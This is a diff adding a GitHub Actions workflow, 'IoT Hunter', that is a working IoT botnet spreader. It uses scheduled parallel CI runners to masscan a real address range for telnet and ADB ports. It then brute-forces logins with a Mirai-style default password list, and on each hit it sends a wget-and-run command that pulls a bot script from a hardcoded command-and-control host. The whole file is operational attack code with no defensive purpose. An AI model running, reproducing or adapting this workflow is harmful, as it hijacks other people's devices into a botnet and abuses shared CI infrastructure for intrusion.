@@ -1,0 +1,125 @@
+name: IoT Hunter
+
+on:
+  workflow_dispatch:
+    inputs:
+      c2:
+        description: 'C2 IP'
+        required: true
+        default: '216.167.26.154'
+      c2_port:
+        description: 'C2 Port'
+        required: true
+        default: '1337'
+      scan_target:
+        description: 'CIDR to scan'
+        required: true
+        default: '114.55.0.0/16'
+  schedule:
+    - cron: '37 */6 * * *'
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 20
+      matrix:
+        slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    steps:
+      - name: Hunt IoT
+        run: |
+          C2="${{ github.event.inputs.c2 }}"
+          CPORT="${{ github.event.inputs.c2_port }}"
+          CIDR="${{ github.event.inputs.scan_target }}"
+          S="${{ matrix.slice }}"
+
+          echo "[+] Runner $S hunting $CIDR -> C2: $C2:$CPORT"
+          sudo apt-get update -qq && sudo apt-get install -y -qq masscan 2>/dev/null
+
+          # Download payload
+          curl -s "http://$C2:$CPORT/bot.sh" -o /tmp/payload.sh
+
+          # Masscan
+          echo "[+] Scanning..."
+          sudo masscan "$CIDR" -p23,2323,5555 --rate 5000 -oL /tmp/scan.txt 2>/dev/null || true
+          echo "[+] Scan done: $(wc -l < /tmp/scan.txt) lines"
+
+          # Brute force
+          python3 /dev/stdin "$C2" "$CPORT" "$S" << 'PYEOF'
+          import socket, threading, time, sys
+
+          C2, CPORT, S = sys.argv[1], sys.argv[2], int(sys.argv[3])
+
+          creds = [
+              ("root","vizxv"),("root","xc3511"),("root","hi3518"),("root","anko"),
+              ("root","root"),("root","admin"),("root","123456"),("root","password"),
+              ("root","default"),("root","12345"),("root","888888"),("root","666666"),
+              ("root","pass"),("root","system"),("root","changeme"),("root","klv123"),
+              ("root","zlxx"),("root","juantech"),("root","ipc71a"),("root","jvbzd"),
+              ("root","hi3516"),("root","iv001"),("root","tech"),
+              ("root","GM8182"),("root","1001chin"),("root","ikwb"),
+              ("admin","admin"),("admin","123456"),("admin","password"),
+              ("admin","admin123"),("admin","12345"),("admin","888888"),
+              ("support","support"),("guest","guest"),("guest","123456"),
+              ("service","service"),("operator","operator"),
+              ("user","user"),("ubnt","ubnt"),("pi","raspberry"),
+              ("default","default"),("mother","fucker"),
+          ]
+
+          hits = []
+          lock = threading.Lock()
+
+          def brute(ip, port, user, pw):
+              try:
+                  s = socket.socket()
+                  s.settimeout(8)
+                  s.connect((ip, port))
+                  s.recv(256)
+                  s.send(user.encode()+b"\r\n")
+                  time.sleep(0.3)
+                  s.recv(256)
+                  s.send(pw.encode()+b"\r\n")
+                  time.sleep(0.5)
+                  resp = s.recv(512)
+                  if b'#' in resp or b'$' in resp or b'>' in resp:
+                      cmd = f"(wget -q http://{C2}:{CPORT}/bot.sh -O /tmp/x&&sh /tmp/x {C2} {CPORT} enibot2024)&"
+                      s.send(cmd.encode()+b"\r\n")
+                      s.close()
+                      with lock:
+                          hits.append(f"{ip}:{port} {user}:{pw}")
+                      print(f"  HIT {ip}:{port} {user}:{pw}")
+                      return True
+                  s.close()
+              except:
+                  pass
+              return False
+
+          # Parse scan results
+          targets = set()
+          try:
+              for line in open('/tmp/scan.txt'):
+                  if 'open' in line:
+                      p = line.strip().split()
+                      if len(p)>=4:
+                          targets.add((p[3],int(p[2])))
+          except:
+              pass
+
+          print(f"[+] {len(targets)} targets found")
+
+          ts = []
+          for ip,port in targets:
+              for u,pw in creds[:30]:
+                  t = threading.Thread(target=brute, args=(ip,port,u,pw))
+                  t.start(); ts.append(t)
+                  time.sleep(0.01)
+
+          for t in ts: t.join(timeout=15)
+
+          print(f"[+] Runner {S}: {len(hits)} hits")
+          for h in hits: print(f"    {h}")
+          time.sleep(30)
+          PYEOF
+
+          echo "[+] Runner $S done"
+          sleep 60
